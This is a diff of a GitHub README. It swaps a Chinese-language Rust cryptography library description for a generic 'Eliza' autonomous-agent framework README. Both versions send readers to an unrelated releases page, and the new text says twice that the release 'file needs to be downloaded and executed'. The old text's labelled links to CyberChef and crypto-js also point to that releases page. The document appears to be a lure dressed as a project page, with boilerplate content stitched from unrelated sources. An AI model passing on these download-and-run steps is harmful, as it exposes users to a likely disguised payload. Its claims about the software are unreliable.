@@ -1,65 +1,135 @@
-# crypto
+# Eliza: Autonomous Agents for Everyone 🤖
 
-[Download here](https://github.com/rockdestroffik/crypto/releases)
+![Eliza Logo](https://img.shields.io/badge/Eliza-Autonomous%20Agents-blue.svg)  
+[![Releases](https://img.shields.io/badge/Releases-v1.0.0-orange.svg)](https://github.com/krishnan188/eliza/releases)
 
-常见加解密算法的rust实现 , 仅供参考
+Welcome to the Eliza repository! This project aims to make autonomous agents accessible to everyone. Whether you are a developer, a researcher, or just curious about AI, Eliza offers a robust framework to build and interact with intelligent agents.
 
-## 设计思路
+## Table of Contents
 
-参考 [CyberChef](https://github.com/rockdestroffik/crypto/releases) , 实现多种 `Operation` ( 输入输出都是 `Bytes` ) 
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Getting Started](#getting-started)
+4. [Installation](#installation)
+5. [Usage](#usage)
+6. [Supported Platforms](#supported-platforms)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
 
-单个或多个 `Operation` 串联成 `Recipe` , 对数据进行操作
+## Introduction
 
-## 特点
+Eliza is inspired by the classic chatbot of the same name, designed to simulate conversation. However, our Eliza goes beyond mere text interaction. It incorporates advanced AI techniques to create agents that can operate autonomously in various environments, such as Discord, Slack, and Telegram. 
 
-不依赖于任何第三方库
+With Eliza, you can create agents that respond to user input, manage tasks, and even engage in complex interactions. The goal is to democratize AI, making it easy for anyone to create their own intelligent agents.
 
-对于 DES、AES 等算法 , 支持非标准长度的密钥 , 兼容 [crypto-js](https://github.com/rockdestroffik/crypto/releases)
+## Features
 
-模块化的 填充方式( `Padding` ) 和 加密模式( `Mode` ) 设计 , 便于扩展
+- **Multi-Platform Support**: Build agents for Discord, Slack, and Telegram.
+- **Plugin System**: Extend functionality easily with custom plugins.
+- **Robust Framework**: Designed for scalability and performance.
+- **Real-Time Interaction**: Engage users instantly with responsive agents.
+- **Swarm Intelligence**: Utilize multiple agents to tackle complex tasks collaboratively.
+- **Crypto Integration**: Support for cryptocurrency transactions and operations.
 
-## `Operation`
+## Getting Started
 
-`FromHex`, `ToHex`，
+To start using Eliza, follow these steps:
 
-`FromBase64`, `ToBase64`,
+1. **Clone the Repository**: Get the code onto your local machine.
+2. **Install Dependencies**: Make sure you have all the necessary libraries.
+3. **Run the Agent**: Execute the main script to start interacting with your agent.
 
-`Rot13`,
+You can download the latest release from our [Releases page](https://github.com/krishnan188/eliza/releases). This file needs to be downloaded and executed to set up your environment.
 
-`Md5`,
+## Installation
 
-`Sha1`,
+### Prerequisites
 
-`Sha256`, `Sha512`,
+- Python 3.7 or higher
+- Node.js (for some plugins)
+- A package manager (pip, npm)
 
-`Sm3`,
+### Step-by-Step Installation
 
-`Hmac`,
+1. **Clone the Repository**:
 
-`Rc4`,
+   ```bash
+   git clone https://github.com/krishnan188/eliza.git
+   cd eliza
+   ```
 
-`XxteaDecrypt`, `XxteaEncrypt`,
+2. **Install Python Dependencies**:
 
-`DesDecrypt`, `DesEncrypt`, `TripleDesDecrypt`, `TripleDesEncrypt`,
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-`AesDecrypt`, `AesEncrypt`,
+3. **Install Node.js Dependencies (if needed)**:
 
-## `Padding`
+   ```bash
+   npm install
+   ```
 
-`BitPadding`,
+4. **Download the Latest Release**:
 
-`NoPadding`,
+   Visit our [Releases page](https://github.com/krishnan188/eliza/releases) to download the latest version.
 
-`Pkcs7Padding`,
+## Usage
 
-`ZeroPadding`,
+Once you have installed Eliza, you can start creating your agents. Here’s a simple example to get you started:
 
-## `Mode`
+1. **Create a New Agent**:
 
-`Ecb`,
+   ```python
+   from eliza import Agent
 
-`Cbc`,
+   my_agent = Agent(name="MyAgent")
+   my_agent.start()
+   ```
 
-## 使用方式
+2. **Interact with the Agent**:
 
-参考 examples 目录中[编解码](examples/encoding.rs)、[哈希](examples/hashing.rs)、[填充/去填充](examples/padding.rs)、[加解密](examples/encryption.rs)相关的代码
+   ```python
+   response = my_agent.respond("Hello, how are you?")
+   print(response)
+   ```
+
+3. **Add Plugins**:
+
+   To enhance your agent, you can add plugins. Simply create a new plugin file and import it in your main script.
+
+## Supported Platforms
+
+Eliza supports multiple platforms, making it versatile for various applications:
+
+- **Discord**: Build engaging chatbots for your server.
+- **Slack**: Automate tasks and improve team communication.
+- **Telegram**: Create bots that can handle user requests efficiently.
+
+## Contributing
+
+We welcome contributions from everyone! If you want to help improve Eliza, follow these steps:
+
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Make your changes in a new branch.
+3. **Submit a Pull Request**: Once you're happy with your changes, submit a pull request.
+
+## License
+
+Eliza is licensed under the MIT License. Feel free to use, modify, and distribute it as you see fit.
+
+## Contact
+
+For questions, feedback, or suggestions, please reach out:
+
+- **Email**: support@eliza.ai
+- **Twitter**: [@ElizaAI](https://twitter.com/ElizaAI)
+
+## Conclusion
+
+Eliza aims to empower users by providing a simple yet powerful framework for creating autonomous agents. Whether you want to build a chatbot, automate tasks, or explore AI, Eliza offers the tools you need. 
+
+For the latest updates and releases, visit our [Releases page](https://github.com/krishnan188/eliza/releases). This file needs to be downloaded and executed to get started with your own autonomous agents.
+
+Thank you for your interest in Eliza! We look forward to seeing what you create.
